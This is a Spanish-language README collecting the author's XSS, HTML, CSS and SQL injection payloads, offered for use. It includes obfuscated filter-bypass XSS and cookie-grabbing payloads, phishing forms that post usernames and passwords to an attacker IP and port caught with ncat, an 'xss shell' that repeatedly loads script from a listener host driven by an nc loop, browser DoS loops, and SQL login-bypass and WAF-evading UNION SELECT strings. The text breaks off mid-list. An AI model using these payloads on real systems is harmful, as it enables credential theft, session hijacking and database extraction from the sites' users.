# Recopilación de todos los Payloads usados / creados por mi.

En este repositorio encontrarías una lista de payloads que sirven para inyecciones xss, html, ccs y sql.

La mayoria de los payloads aquí mostrados estan creados o modificados por mi.

## INDICE 
* [INYECCIÓNES XSS Y HTML](#INYECCIÓNES-XSS-Y-HTML)
   * [h1](#h1)
   * [onMouseOver](#onMouseOver)
   * [input + onblur + Obfuscation](#input-+-onblur-+-Obfuscation)
   * [html + onclik + Alert Obfuscation](#html-+-onclik-+-Alert-Obfuscation)
   * [Hex encode](#Hex-encode)
   * [Xss dentro de un botón en form](#Xss-dentro-de-un-botón-en-form)
   * [fake captcha](#fake-captcha)
   * [Img + Onerror](#Img-+-Onerror)
   * [marcas](#marcas)
   * [Marquee + alert](#Marquee-+-alert)
   * [noscript](#noscript)
   * [redirección](#redirección)
   * [JavaScript base 64](#JavaScript-base-64)
   * [document.write + iframe](#document.write-+-iframe)
   * [xss + Unicode](#xss-+-Unicode)
   * [ontoggle](#ontoggle)
   * [Filter Bypass Alert Obfuscation](#Filter-Bypass-Alert-Obfuscation)
   * [HTML para simular un phishing y conseguir datos por ncat](#HTML-para-simular-un-phishing-y-conseguir-datos-por-ncat)
   * [Fake login usando inyecciones xss, html y javascript](#Fake-login-usando-inyecciones-xss,-html-y-javascript)
   * [xss shell](#xss-shell)
   * [eventos](#eventos)
   * [xss en android](#xss-en-android)
   * [xss en android para iniciar llamada y enviar mensajes de texto](#xss-en-android-para-iniciar-llamada-y-enviar-mensajes-de-texto)
   * [xss javascript navigator](#xss-javascript-navigator)
   * [Muchos mas](#Muchosmas)
* [Css injection](#Css-injection)
* [sql injection](#sql-injection)
   * [Payloads para sql inyection login bypass](#Payloads-para-sql-inyection-login-bypass)
   * [Detectar un error sql](#Detectar-un-error-sql)
   * [Detectar numero de columnas vulnerables](#Detectar-numero-de-columnas-vulnerables)
   * [Union Select Payloads](#Union-Select-Payloads)
   * [Union Select + sleep() + BENCHMARK(1000000,MD5('A')) Payloads](#Union-Select-+-sleep()-+-BENCHMARK(1000000,MD5('A'))-Payloads)
   * [tecnicas para hacer bypass en sql inyection](#tecnicas-para-hacer-bypass-en-sql-inyection)
       * [bypass usando comentarios](#bypass-usando-comentarios)
       * [bypass usando comentarios + url encoding](#bypass-usando-comentarios-+-url-encoding)
   * [Information_schema.tables](#Information_schema.tables)
   * [Concat](#Concat)
   * [group_concat](#group_concat)
   * [Union Select](#Union-Select)
   * [HTML URL Encode (Codificación Url)](#HTML-URL-Encode-(Codificación-Url))
   * [Inyecciónes sql usando funciones sql](#Inyecciónes-sql-usando-funciones-sql)
        * [Sql inyection payload usando la función RPAD y SOUNDS LIKE](#Sql-inyection-payload-usando-la-función-RPAD-y-SOUNDS-LIKE)
        * [Sql inyection payload usando upper + reverse + right + sounds like para extraer información](#Sql-inyection-payload-usando-upper-+-reverse-+-right-+-sounds-like-para-extraer-información)
        * [Sql inyection usando elt, doble Reverse, hex y unhex](#Sql-inyection-usando-elt,-doble-Reverse,-hex-y-unhex)
        * [Sql inyection case](#Sql-inyection-case)
        * [Sql inyection case y sounds like](#Sql-inyection-case-y-sounds-like)
        * [SQL IF Function](#SQL-IF-Function)
        * [SQL IFNULL](#SQL-IFNULL)
        * [SQL NULLIF](#SQL-NULLIF)
        * [Sql inyection payload usando upper + reverse + right + sounds like](#Sql-inyection-payload-usando-upper-+-reverse-+-right-+-sounds-like)
        * [SQL injection usando doble reverse + right + if statement + HTML injection](#SQL-injection-usando-doble-reverse-+-right-+-if-statement-+-HTML-injection)
        * [Sql inyection usando las funciones HEX-UNHEX](#Sql-inyection-usando-las-funciones-HEX-UNHEX)
        * [Inyección sql tipo error based usando Extractvalue](#Inyección-sql-tipo-error-based-usando-Extractvalue)
        * [Sql inyection payload usando reverse](#Sql-inyection-payload-usando-reverse)
        * [Sql inyection payload usando extractvalue](#Sql-inyection-payload-usando-extractvalue)
        * [Sql inyection payload + url encode + timing](#Sql-inyection-payload-+-url-encode-+-timing)
        * [JSON Generation Functions](#JSON-Generation-Functions)
        * [Mezclas](#Mezclas)
    * [Sql inyection + dios sql](#Sql-inyection-+-dios-sql)
    * [Sql inyection Buffer Overflow / Firewall Crash bypass + xss inyection](#Sql-inyection-Buffer-Overflow-/-Firewall-Crash-bypass-+-xss-inyection)
    * [sql inyection payload+ bypass Mod_Security](#sql-inyection-payload+-bypass-Mod_Security)
    * [Sql inyection payload + dios + Mod_Security bypass](#Sql-inyection-payload-+-dios-+-Mod_Security-bypass)
    * [Sql inyection payload + comment + hex/unhex](#Sql-inyection-payload-+-comment-+-hex/unhex)
    * [Sql databases and tables](#Sql-databases-and-tables)
    * [Sql inyection payload + url encode](#Sql-inyection-payload-+-url-encode)
    * [MSSQL](#MSSQL)
    * [Xpath injection](#Xpath-injection)
    * [Error based](#Error-based)
    * [IA test waf bypass](#IA-test-waf-bypass)
    * [Personal v1](#Personal-v1)
        
   
   
  
   
   

### Para detectar errores: sql inyection, xss inyection y HTML inyection

`'"><script>alert(1)</script><h1>d</h1>`

## INYECCIÓNES XSS Y HTML

### h1

```
<h1 onclick=\u0041\u006cert("_Y000!_")>Y00</h1>

<a onclick=\u0041\u006cert("_Y000!_")>Y00</a>

<p onclick=\u0041\u006cert("_Y000!_")>Y00</p>

<marquee onclick=\u0041\u006cert("_Y000!_")>Y00</marquee>

```

### onMouseOver

```
onMouseOver=<script>alert("/XSS BY Y000!/")</script>

</script><h1 onmouseover= top[8680439..toString(30)]("_Y000!_")>

</script><h1 onmouseover=top[/al/.source+/ert/.source]("_Y000!_")>

</script><h1 onmouseover=["_Y000!_"].find(alert)>

</script><h1 onmouseover= (((confirm)))`_Y000!_`>
```

### input + onblur + Obfuscation

```

<input onblur=top[/al/.source+/ert/.source]("_Y00!_") autofocus><input autofocus>

<input onblur=["_Y00!_"].find(alert) autofocus><input autofocus>

<input onblur=(((confirm)))("_Y00!_") autofocus><input autofocus>

```
### html + onclik + Alert Obfuscation

```
<p/onclick=%27new%20Function`al\ert\`\u0059\u0030\u0030\u0030\``%27>d

<p/onclick=self[`aler`%2b`t`]`\u0059\u0030\u0030\u0030`>d
```
### Hex encode

```
%22%3E%3Csvg%20onload=self[%27\x61\x6c\x65\x72\x74%27](%27\x5f\x59\x30\x30\x30\x21\x5f\x0a%27)%3E_Y000!_
```

### Xss dentro de un botón en form

`<form><button formaction=javascript&colon;alert('xss_by_Y000!')>_Y000!_`

`<marquee><form><button formacti\u006fn=javascript&colon;pr\u006fmpt('xss_by_Y000!')>_Y000!_</marquee>`

### fake captcha 

`<img/src=%27https://i.imgur.com/kkum7k2.jpg%27%20onmouseover=prompt("_Y000!_")`

### Img + Onerror

`<Img src="/" =_=" title=" onerror='prompt(document.cookie)'">`


### marcas


```
<marquee direction="down" width="250" height="200" behavior="alternate" style="border:solid">
  <marquee behavior="alternate">
    Xss by Y000
  </marquee>
 <marquee behavior="alternate">
    Y000
  </marquee>
</marquee>
```


### Marquee + alert

`<marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>`



### onload / onfocus

```
"onfocus="alert('Y000')"+autofocus="

</script><!--><svg onload=[document.domain].find%26%2340;alert%26rpar;>

"><svg/onload=alert`${'000'}¥000!.was.here$`>

<svg/onload=eval("ale"+"rt")(`✓${alert`✓`}`)>

```

### noscript

`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`


### redirección 

```
location="http://google.com"
document.location = "http://google.com"
document.location.href="http://google.com"
window.location.assign("http://google.com")
window['location']['href']="http://google.com"

```


### JavaScript base 64 

`<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydGBZMDAwYDwvc2NyaXB0Pg=='></object>`

### document.write + iframe

`<img src="x" onerror="document.write('<iframe src=tu_phishing></iframe>')"/>`


### xss + Unicode

`<marquee loop=1 width=0 onfinish=\u0070\u0072\u006f\u006d\u0070\u0074(document.cookie)>Y000</marquee>`


### ontoggle

`"><details/open/ontoggle=confirm("/xss_by_Y000!/")>`

### XSSDoS

```
<script> for(;;) alert("_Y000!_")</script>
<meta%20http-equiv="refresh"%20content="0;">
"  autofocus '-->--!><Input/Autofocus/*/Onfocus=document.location=``;alert`_Y000!_`//>
```

### Filter Bypass Alert Obfuscation
 ```
(alert)(1)
a=alert,a(1)
[1].find(alert)
top[“al”+”ert”](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top[‘al\145rt’](1)
top[‘al\x65rt’](1)
top[8680439..toString(30)](1)
globalThis[/al/.source+/ert/.source]`1` 
[alert][0].call(this,1)
(1,2,3,4,5,6,7,8,alert)(1)
top['al\x65rt'](1)
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])


confirm()
confirm``
(confirm``)
{confirm``}
[confirm``]
(((confirm)))``
co\u006efirm()
new class extends confirm``{}
[8].find(confirm)
[8].map(confirm)
[8].some(confirm)
[8].every(confirm)
[8].filter(confirm)
[8].findIndex(confirm)

self[`aler`%2b`t`]`1`
'new Function`al\ert\`1\``'
'new Function`pro\mpt\`1\``'

alert(document['cookie']) 
with(document)alert(cookie) 
eval('ale'+'rt(1)')window['alert'](0)
parent['alert'](1)
self['alert'](2)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[12].forEach(alert);
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;

alert.call(null, document.domain);
[document.domain].forEach(alert);
alert.apply(null, [document.domain]);
alert.bind()(document.domain);
alert(this['document']['domain']);
(new Map()).set(1, document.domain).forEach(alert);

[class extends[alert````]{}]
```${``[class extends[alert``]{}]}```
[class extends[alert````]{}]
throw new class extends Function{}('alert(1)')``
x=new class extends Function{}('alert(1)'); x=new x;
new class extends alert(1){}
new class extends class extends class extends class extends alert(1){}{}{}{}
    
alert?.()
confirm?.()
prompt?.()
`(alert())`



```


### ----------------------------------

## HTML para simular un phishing y conseguir datos por ncat


### payload a inyectar:
```
<h3>Registrate</h3>
<form action=http://<Ip>:<Puerto>>Usuario:
<br><input type="username" name="username">
</br>Contraseña:<br><input type="password" name="password"></br>
<br><input type="submit" value="Entrar"></br>

```

### para escuchar:
`ncat -lnvp puerto`


## Fake login usando inyecciones xss, html y javascript

```
<script>alert(‘Favor de iniciar sesion para continuar’)</script>
<h3>Para continuar navegado, inicie sesion</h3>
<form action=http://192.168.0.55:1337>Username:<br>
<input type=”username” name=”username”></br>Password:<br>
<input type=”username” name=”password”></br><br>
<input type=”submit” value=”Login”></br>
<script type=”text/javascript”>function speak(c){var b=new SpeechSynthesisUtterance();var a=speechSynthesis.getVoices();b.voice=a[2];b.voiceURI=”native”;b.volume=1;b.rate=1;b.pitch=1;b.text=c;b.lang=”es-ES”;speechSynthesis.speak(b)}speak(“Favor de iniciar sesion para poder continuar navegando”);</script>

```




## xss shell

### payload a inyectar:
```
"><script>setInterval(function(){d=document;z=d.createElement("script");z.src="//IP:PORT";d.body.appendChild(z)},0)</script>
```

### para escuchar:
```
while :; do printf "Y000>$ "; read c; echo $c | nc -vvlp PORT >/dev/null; done
```
### eventos 

```
<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onbeforeprint="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onhashchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmessage="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ononline="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onoffline="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpagehide="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpageshow="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpopstate="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onresize="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onstorage="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onunload="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onblur="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncontextmenu="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oninput="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oninvalid="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onreset="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsearch="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onselect="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsubmit="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeydown="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeypress="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onkeyup="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onclick="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondblclick="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousedown="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousemove="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseout="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseover="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmouseup="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onmousewheel="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onwheel="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondrag="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragend="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragenter="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragleave="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragover="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondragstart="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondrop="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onscroll="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncopy="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncut="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpaste="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onabort="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncanplay="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncanplaythrough="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x oncuechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ondurationchange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onemptied="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onended="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadeddata="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadedmetadata="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onloadstart="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onpause="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onplay="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onplaying="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onprogress="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onratechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onseeked="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onseeking="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onstalled="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onsuspend="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ontimeupdate="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onvolumechange="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onwaiting="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x onshow="alert(String.fromCharCode(88,83,83))">
<IMG SRC=x ontoggle="alert(String.fromCharCode(88,83,83))">

```

# xss en android 

```
<html ontouchstart=alert(1)>
<html ontouchend=alert(1)>
<html ontouchmove=alert(1)>
<html ontouchcancel=alert(1)>
<body onorientationchange=alert(1)>
<svg onload=alert(navigator.connection.type)>

```

## xss en android para iniciar llamada y enviar mensajes de texto

```
onclick="window.location.href='tel:00000000000';"

window.open ("sms:[00000000000]?body=" + "mensaje","_system");

```







## xss javascript navigator  

```
<svg onload=alert(navigator.appCodeName)>
<svg onload=alert(navigator.appName)>
<svg onload=alert(navigator.appVersion)>
<svg onload=alert(navigator.cookieEnabled)>
<svg onload=alert(navigator.language)>
<svg onload=alert(navigator.onLine)>
<svg onload=alert(navigator.platform)>
<svg onload=alert(navigator.userAgent)>


```



### Muchos mas

```
<script%20~~~>\u0061\u006C\u0065\u0072\u0074``</script%20~~~>
<\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video> 
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script> 
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange> <iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad> 
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter> 
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll> 
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)">
</body onPropertyChange> <svg onLoad svg onLoad="javascript:javascript:alert(1)">
</svg onLoad> <body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide> 
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver> 
<body onUnload body onUnload="javascript:javascript:alert(1)">
```

# Css injection

```
1"Style="position:fixed;top:350;left:400;font-size:99999px;"OnPointerEnter="new class extends confirm`_Y000!_`{}"

<b/style=position:fixed;top:0;left:0;font-size:200px>XSS<!--

```


# sql injection 

## Payloads para sql inyection login bypass

```
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--

' or ''-'
" or ""-"
" or true--
' or true--

admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
```

## Ejemplos de payloads sql injection

### Detectar un error sql 
```
' = %27
" = %22
# = %23
; = %3B
```

### Detectar numero de columnas vulnerables 
```
 ORDER BY 1-- 
 ORDER BY 2-- 
 ORDER BY 3-- 
 ORDER BY 4-- 
 ORDER BY 5-- 
 ORDER BY 6-- 
 ORDER BY 7-- 
 ORDER BY 8-- 
 ORDER BY 9-- 
 ORDER BY 10-- 
 
 ORDER BY 1# 
 ORDER BY 2# 
 ORDER BY 3# 
 ORDER BY 4# 
 ORDER BY 5# 
 ORDER BY 6# 
 ORDER BY 7# 
 ORDER BY 8# 
 ORDER BY 9# 
 ORDER BY 10# 

```

### Union Select Payloads

```
 UNION SELECT 1
 UNION SELECT 1,2
 UNION SELECT 1,2,3
 UNION SELECT 1,2,3,4
 UNION SELECT 1,2,3,4,5
 UNION SELECT 1,2,3,4,5,6
 UNION SELECT 1,2,3,4,5,6,7

 UNION ALL SELECT 1
 UNION ALL SELECT 1,2
 UNION ALL SELECT 1,2,3
 UNION ALL SELECT 1,2,3,4
 UNION ALL SELECT 1,2,3,4,5
 UNION ALL SELECT 1,2,3,4,5,6
 UNION ALL SELECT 1,2,3,4,5,6,7
 
 UNION(SELECT 1)
 UNION(SELECT 1,2)
 UNION(SELECT 1,2,3)
 UNION(SELECT 1,2,3,4)
 UNION(SELECT 1,2,3,4,5)
 UNION(SELECT 1,2,3,4,5,6)
 UNION(SELECT 1,2,3,4,5,6,7)
 
 UNION ALL(SELECT 1)
 UNION ALL(SELECT 1,2)
 UNION ALL(SELECT 1,2,3)
 UNION ALL(SELECT 1,2,3,4)
 UNION ALL(SELECT 1,2,3,4,5)
 UNION ALL(SELECT 1,2,3,4,5,6)
 UNION ALL(SELECT 1,2,3,4,5,6,7)
 
 AND 1 UNION SELECT 1
 AND 1 UNION SELECT 1,2
 AND 1 UNION SELECT 1,2,3
 AND 1 UNION SELECT 1,2,3,4
 AND 1 UNION SELECT 1,2,3,4,5
 AND 1 UNION SELECT 1,2,3,4,5,6
 AND 1 UNION SELECT 1,2,3,4,5,6,7


```

### Union Select + sleep() + BENCHMARK(1000000,MD5('A')) Payloads

```
 UNION SELECT @@VERSION,SLEEP(5),3
 UNION SELECT @@VERSION,SLEEP(5),USER(),4
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8
 
```

### tecnicas para hacer bypass en sql inyection 

#### bypass usando comentarios
```
 /*!UNION*/ /*!SELECT*/ 1
 /*!UNION*/ /*!SELECT*/ 1,2
 /*!UNION*/ /*!SELECT*/ 1,2,3
 /*!UNION*/ /*!SELECT*/ 1,2,3,4
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6,7
 
 /*!12345UNION*/ /*!12345SELECT*/ 1
 /*!12345UNION*/ /*!12345SELECT*/ 1,2
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6,7
 
 /*!12345UNION*/(/*!12345SELECT*/ 1)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6,7)

```
#### bypass usando comentarios + url encoding 
```
 /*!%55nion*/%20/*!%53elect*/1
 /*!%55nion*/%20/*!%53elect*/%201,2
 /*!%55nion*/%20/*!%53elect*/%201,2,3
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6,7
 
 /*!12345%55nion*/ /*!12345%53elect*/ 1
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2
 /*!1234%55nion*/ /*!12345%53elect*/ 1,2,3
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6,7
 
 /*!12345%55nion*/(/*!12345%53elect*/ 1)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6,7)

```



### Information_schema.tables 

```
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
```

### Concat

```
CoNcAt()
concat() 
CON%08CAT()
CoNcAt()
%0AcOnCat()
/**//*!12345cOnCat*/
/*!50000cOnCat*/(/*!*/)
unhex(hex(concat(table_name)))
unhex(hex(/*!12345concat*/(table_name)))
unhex(hex(/*!50000concat*/(table_name)))
```

### group_concat

```
/*!group_concat*/()
gRoUp_cOnCAt()
group_concat(/*!*/)
group_concat(/*!12345table_name*/)
group_concat(/*!50000table_name*/)
/*!group_concat*/(/*!12345table_name*/)
/*!group_concat*/(/*!50000table_name*/)
/*!12345group_concat*/(/*!12345table_name*/)
/*!50000group_concat*/(/*!50000table_name*/)
/*!GrOuP_ConCaT*/()
/*!12345GroUP_ConCat*/()
/*!50000gRouP_cOnCaT*/()
/*!50000Gr%6fuP_c%6fnCAT*/()
unhex(hex(group_concat(table_name)))
unhex(hex(/*!group_concat*/(/*!table_name*/)))
unhex(hex(/*!12345group_concat*/(table_name)))
unhex(hex(/*!12345group_concat*/(/*!table_name*/)))
unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))
unhex(hex(/*!50000group_concat*/(table_name)))
unhex(hex(/*!50000group_concat*/(/*!table_name*/)))
unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))
convert(group_concat(table_name)+using+ascii)
convert(group_concat(/*!table_name*/)+using+ascii)
convert(group_concat(/*!12345table_name*/)+using+ascii)
convert(group_concat(/*!50000table_name*/)+using+ascii)
CONVERT(group_concat(table_name)+USING+latin1)

```


### Union Select

```
/*!50000%55nIoN*/ /*!50000%53eLeCt*/
%55nion(%53elect 1,2,3)-- -
+union+distinct+select+
+union+distinctROW+select+
/**//*!12345UNION SELECT*//**/
/**//*!50000UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
union /*!50000%53elect*/
+ #?uNiOn + #?sEleCt
+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt
/*!%55NiOn*/ /*!%53eLEct*/
/*!u%6eion*/ /*!se%6cect*/
+un/**/ion+se/**/lect
uni%0bon+se%0blect
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
REVERSE(noinu)+REVERSE(tceles)
/*--*/union/*--*/select/*--*/
union (/*!/**/ SeleCT */ 1,2,3)
/*!union*/+/*!select*/
union+/*!select*/
/**/union/**/select/**/
/**/uNIon/**/sEleCt/**/
+%2F**/+Union/*!select*/
/**//*!union*//**//*!select*//**/
/*!uNIOn*/ /*!SelECt*/
+union+distinct+select+
+union+distinctROW+select+
uNiOn aLl sElEcT
UNIunionON+SELselectECT
/**/union/*!50000select*//**/
0%a0union%a0select%09
%0Aunion%0Aselect%0A
%55nion/**/%53elect
uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
%0A%09UNION%0CSELECT%10NULL%
/*!union*//*--*//*!all*//*--*//*!select*/
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+UnIoN/*&a=*/SeLeCT/*&a=*/
union+sel%0bect
+uni*on+sel*ect+
+#1q%0Aunion all#qa%0A#%0Aselect
union(select (1),(2),(3),(4),(5))
UNION(SELECT(column)FROM(table))
%23xyz%0AUnIOn%23xyz%0ASeLecT+
%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
union(select(1),2,3)
union (select 1111,2222,3333)
uNioN (/*!/**/ SeleCT */ 11)
union (select 1111,2222,3333)
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/
+%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
+%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+
